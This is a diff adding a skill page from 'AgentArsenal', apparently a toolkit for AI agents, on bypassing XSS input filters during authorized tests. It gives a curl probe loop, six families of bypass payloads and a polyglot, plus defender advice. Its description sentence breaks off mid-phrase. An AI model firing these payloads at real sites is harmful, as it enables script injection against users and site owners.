@@ -1,0 +1,199 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>AgentArsenal: xss-filter-bypass</title>
+<style>
+:root {
+  --bg: #0d1117;
+  --panel: #161b22;
+  --border: #30363d;
+  --text: #e6edf3;
+  --muted: #8b949e;
+  --accent: #58a6ff;
+  --green: #3fb950;
+  --yellow: #d29922;
+  --red: #f85149;
+}
+* { box-sizing: border-box; }
+body {
+  background: var(--bg);
+  color: var(--text);
+  font-family: system-ui, -apple-system, "Segoe UI", Roboto, sans-serif;
+  margin: 0;
+  line-height: 1.6;
+}
+.wrap { max-width: 1100px; margin: 0 auto; padding: 1.5rem; }
+header.site {
+  border-bottom: 1px solid var(--border);
+  background: var(--panel);
+}
+header.site .wrap { display: flex; align-items: center; gap: 1.5rem; flex-wrap: wrap; }
+header.site h1 { font-size: 1.25rem; margin: 0; }
+header.site h1 a { color: var(--text); text-decoration: none; }
+nav a { color: var(--accent); text-decoration: none; margin-right: 1rem; }
+nav a:hover { text-decoration: underline; }
+table { width: 100%; border-collapse: collapse; margin-top: 1rem; }
+th, td { border: 1px solid var(--border); padding: 0.55rem 0.75rem; text-align: left; vertical-align: top; }
+th { background: var(--panel); }
+tbody tr:hover { background: rgba(88, 166, 255, 0.06); }
+a { color: var(--accent); }
+.muted { color: var(--muted); }
+.badge {
+  display: inline-block;
+  padding: 0.12rem 0.6rem;
+  border-radius: 999px;
+  font-size: 0.8rem;
+  font-weight: 600;
+  white-space: nowrap;
+}
+.badge.green { background: rgba(63, 185, 80, 0.12); color: var(--green); border: 1px solid var(--green); }
+.badge.yellow { background: rgba(210, 153, 34, 0.12); color: var(--yellow); border: 1px solid var(--yellow); }
+.badge.red { background: rgba(248, 81, 73, 0.12); color: var(--red); border: 1px solid var(--red); }
+.badge.gray { background: rgba(139, 148, 158, 0.12); color: var(--muted); border: 1px solid var(--muted); }
+#filter {
+  width: 100%;
+  max-width: 28rem;
+  padding: 0.6rem 0.8rem;
+  margin-top: 1rem;
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  color: var(--text);
+  font-size: 1rem;
+}
+pre {
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  padding: 1rem;
+  overflow-x: auto;
+}
+code { font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; font-size: 0.9em; }
+pre code { font-size: 0.85rem; }
+p code, li code, td code {
+  background: rgba(88, 166, 255, 0.1);
+  border: 1px solid var(--border);
+  border-radius: 4px;
+  padding: 0.05rem 0.35rem;
+}
+.meta { display: flex; gap: 0.75rem; flex-wrap: wrap; margin: 1rem 0; align-items: center; }
+.deps { margin: 0.5rem 0; }
+.deps span.kind { color: var(--muted); font-size: 0.85rem; margin-right: 0.4rem; }
+.deps a { margin-right: 0.5rem; }
+h2 { border-bottom: 1px solid var(--border); padding-bottom: 0.4rem; }
+footer { border-top: 1px solid var(--border); margin-top: 2rem; padding: 1rem 0; color: var(--muted); font-size: 0.85rem; }
+.legend { display: flex; gap: 1.5rem; flex-wrap: wrap; margin: 1rem 0; color: var(--muted); font-size: 0.9rem; }
+.legend svg { vertical-align: middle; margin-right: 0.4rem; }
+.graph-note { color: var(--muted); font-size: 0.9rem; }
+</style>
+</head>
+<body>
+<header class="site">
+<div class="wrap">
+<h1><a href="../index.html">AgentArsenal</a></h1>
+<nav>
+<a href="../index.html">Skills</a>
+<a href="../index.html#agents">Agents</a>
+<a href="../index.html#brains">Brains</a>
+<a href="../index.html#playbooks">Playbooks</a>
+<a href="../index.html#decisions">Decisions</a>
+<a href="../graph.html">Dependency graph</a>
+</nav>
+</div>
+</header>
+<main class="wrap">
+<p><a href="../index.html">&larr; All skills</a></p><h2>xss-filter-bypass</h2><div class="meta"><span class="badge gray">web</span><span class="muted">v1.0.0</span><span class="badge green">stable</span><span class="badge green">95/100</span><span class="muted">verified 2026-10-23</span></div><p>Use when an XSS reflection point exists but input filters,</p><div class="deps"><span class="kind">sub-skill of:</span> <a href="web-xss.html">web-xss</a></div><div class="deps"><span class="kind">requires:</span> <a href="web-xss.html">web-xss</a></div><div class="deps"><span class="kind">extends:</span> <span class="muted">none</span></div><div class="deps"><span class="kind">relates:</span> <a href="web-sqli.html">web-sqli</a></div><h2>Tools</h2><table><thead><tr><th>Tool</th><th>Version</th></tr></thead><tbody><tr><td>Burp Suite</td><td>2026.2</td></tr><tr><td>curl</td><td>8.5</td></tr><tr><td>Python</td><td>3.12</td></tr></tbody></table><p>Filters try to make dangerous input safe by stripping tags, encoding characters, or blocking keywords. Most hand-rolled filters fail because browsers parse HTML in surprising ways. This skill covers systematic filter bypass on authorized tests: fingerprinting exactly what the filter does, then picking the bypass family that survives it. The rule is one change per request, so you learn which transformation defeats the filter instead of guessing.</p>
+<h2>Quick Workflow</h2>
+<ol>
+<li>Confirm the reflection point and its context with a canary.</li>
+<li>Fingerprint the filter: submit a probe alphabet of tags, attributes,</li>
+<p>quotes, and encodings, and record what survives.</p>
+<li>Classify the filter: block-list of keywords, strip of tags, encoding of</li>
+<p>special characters, or length limit.</p>
+<li>Pick the bypass family that matches the weakness, and test one variant</li>
+<p>at a time.</p>
+<li>Confirm execution in a real browser with a harmless marker.</li>
+<li>Document the exact filter behavior and the minimal working bypass.</li>
+</ol>
+<h2>1. Filter fingerprinting</h2>
+<pre><code class="language-bash"># Probe alphabet: send each token and see what reflects
+for token in &#x27;&lt;script&gt;&#x27; &#x27;&lt;svg&gt;&#x27; &#x27;&lt;img&#x27; &#x27;onerror&#x27; &#x27;onload&#x27; &#x27;&quot;&#x27; &quot;&#x27;&quot; &#x27;(&#x27; &#x27;)&#x27; &#x27;;&#x27; &#x27;javascript:&#x27; &#x27;alert&#x27;; do
+  enc=$(python3 -c &quot;import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))&quot; &quot;$token&quot;)
+  out=$(curl -s &quot;https://target.example/search?q=${enc}&quot;)
+  if echo &quot;$out&quot; | grep -qF &quot;$token&quot;; then echo &quot;PASS: $token&quot;; else echo &quot;BLOCKED: $token&quot;; fi
+done
+
+# Check for case sensitivity in keyword blocks
+for token in &#x27;&lt;ScRiPt&gt;&#x27; &#x27;&lt;SCRIPT&gt;&#x27;; do
+  enc=$(python3 -c &quot;import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))&quot; &quot;$token&quot;)
+  curl -s &quot;https://target.example/search?q=${enc}&quot; | grep -qF &quot;$token&quot; &amp;&amp; echo &quot;PASS: $token&quot;
+done</code></pre>
+<p>Record the result table. The pattern of passes and blocks tells you the filter family: case-sensitive block-list, tag stripper, or encoder.</p>
+<h2>2. Bypass families</h2>
+<pre><code class="language-bash"># Family 1: keyword block-list is case sensitive -&gt; change case
+# &lt;ScRiPt&gt;alert(1)&lt;/ScRiPt&gt;
+
+# Family 2: single-pass stripper -&gt; nest the keyword
+# &lt;scr&lt;script&gt;ipt&gt; becomes &lt;script&gt; after one strip pass
+
+# Family 3: parentheses blocked -&gt; use template literals or throw
+# &lt;svg onload=alert`1`&gt;
+# &lt;img src=x onerror=throw/**/1&gt;
+
+# Family 4: quotes blocked -&gt; quote-free attributes and handlers
+# &lt;svg/onload=alert(1)&gt;
+# &lt;body onload=alert(1)&gt;
+
+# Family 5: &lt;script&gt; blocked but events allowed -&gt; handler vectors
+# &quot; autofocus onfocus=alert(1) x=&quot;
+# &lt;details open ontoggle=alert(1)&gt;
+
+# Family 6: encoding tricks for reflected-in-JS contexts
+# &lt;\/script&gt; breaks out of a JS string inside a script block</code></pre>
+<p>Test one family at a time. When a family works, minimize the payload to the shortest variant that still executes; short payloads survive length limits and fit more contexts.</p>
+<h2>3. Polyglots for unknown contexts</h2>
+<p>When you cannot pin the exact context, a polyglot fires in several at once.</p>
+<pre><code class="language-bash"># Classic polyglot, works in HTML body, attribute, and JS string contexts
+jaVasCript:/*-/*`/*\`/*&#x27;/*&quot;/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\x3csVg/&lt;sVg/oNloAd=alert()//&gt;\x3e
+
+# Shorter modern polyglot for quick probing
+&#x27;&quot;&gt;&lt;svg onload=alert(1)&gt;</code></pre>
+<p>Use polyglots for discovery, then replace with the minimal context-specific payload for the report. A polyglot in a report looks like guessing; a minimal payload looks like understanding.</p>
+<h2>Edge cases</h2>
+<ul>
+<li>The filter strips on input but the render path decodes again. Your probe</li>
+<p>alphabet must be checked at the render point, not at the storage echo.</p>
+<li>Double encoding defeats the filter but the browser decodes once. Match</li>
+<p>your encoding depth to the application&#x27;s decode depth exactly.</p>
+<li>Length limits truncate mid-payload. Split across multiple parameters</li>
+<p>that concatenate on the page, or use the shortest known vectors.</p>
+<li>The WAF blocks your IP after several blocks. Slow down, stay in the</li>
+<p>agreed window, and note the WAF behavior instead of hammering it.</p>
+</ul>
+<h2>Escalation</h2>
+<ul>
+<li>Every family fails: the filter may be a real sanitizer (DOMPurify with a</li>
+<p>strict config). Verify by checking whether obviously dangerous input like <code>&lt;svg onload=alert(1)&gt;</code> is neutralized at render; if it is, the filter holds and you move on.</p>
+<li>The bypass needs an unusual browser quirk: confirm in two browsers and</li>
+<p>note the version dependence; a quirk that works only in an old browser is a weaker finding.</p>
+<li>You suspect mutation XSS (mXSS): test by injecting into an <code>innerHTML</code></li>
+<p>sink and reading back the serialized DOM; mXSS payloads change shape when the browser re-parses them, so check the DOM, not the source.</p>
+</ul>
+<h2>Detection and defender view</h2>
+<p>Defenders see filter bypass attempts as varied, mutating payloads from one source: case changes, nested tags, and encoding tricks in quick succession. WAF logs capture the blocked variants, which is useful intelligence about attacker creativity. Durable defense is context-aware output encoding plus a maintained sanitizer allow-list, never a hand-rolled block-list; every bypass family in this skill exists because a block-list was trusted.</p>
+<h2>Key references</h2>
+<ul>
+<li>CWE-79 (Improper Neutralization of Input During Web Page Generation,</li>
+<p>Cross-site Scripting).</p>
+<li>OWASP XSS Filter Evasion Cheat Sheet.</li>
+<li>OWASP Testing Guide: Testing for Cross Site Scripting.</li>
+<li>PortSwigger Web Security Academy: XSS filter bypass labs.</li>
+</ul>
+</main>
+<footer class="wrap">
+<p>AgentArsenal docs. Generated 2026-10-23.</p>
+</footer>
+</body>
+</html>
